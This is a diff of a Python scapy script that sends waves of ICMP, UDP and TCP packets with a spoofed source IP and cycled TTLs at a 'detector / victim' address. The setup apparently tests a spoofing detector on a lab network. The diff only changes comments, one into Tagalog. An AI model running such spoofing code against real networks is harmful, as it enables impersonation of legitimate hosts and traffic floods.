@@ -16,7 +16,7 @@ import time
 from scapy.all import IP, UDP, TCP, ICMP, send, conf
 
 # ---------------- CONFIG ----------------
-INTERFACE_USED = "\\Device\\NPF_Loopback"   # copy exact name from scapy.show_interfaces()
+INTERFACE_USED = "\\Device\\NPF_Loopback"   # xact name from scapy.show_interfaces()
 REAL_ATTACKER_IP = "10.1.1.30"              # attacker machine real IP (unused for spoofed pkts)
 TARGET_IP = "10.1.1.10"                     # detector / victim IP
 SPOOFED_IP = "10.1.1.20"                    # impersonated legitimate client IP
@@ -68,24 +68,23 @@ def launch():
             name, count, inter_delay, ttl_list, pkt_type = wave
             print(f"\n--- WAVE {wave_idx}: {name} ---")
             sent_in_wave = 0
-
-            # prepare deterministic pkt-type cycle for MIXED
+          
             mixed_seq = ["TCP", "UDP", "ICMP"]
 
             # compute progress interval to avoid printing each packet
             progress_interval = max(1, count // PROGRESS_STEPS)
 
             for i in range(count):
-                # deterministic TTL selection (cycled through ttl_list)
+        
                 ttl = ttl_list[i % len(ttl_list)]
 
-                # pick packet type deterministically
+            
                 if pkt_type == "MIXED":
                     ptype = mixed_seq[i % len(mixed_seq)]
                 else:
                     ptype = pkt_type
 
-                # construct packet using spoofed source (this is the actual spoof)
+                # construct packet using spoofed source (eto yung actual spoof)
                 pkt = None
                 if ptype == "ICMP":
                     pkt = IP(src=SPOOFED_IP, dst=TARGET_IP, ttl=ttl)/ICMP()
@@ -104,7 +103,7 @@ def launch():
 
                 time.sleep(inter_delay)
 
-            # wave TTL distribution summary (deterministic)
+            # wave TTL distribution summary
             dist = {}
             for i in range(count):
                 t = ttl_list[i % len(ttl_list)]
@@ -127,3 +126,4 @@ def launch():
 
 if __name__ == "__main__":
     launch()
+
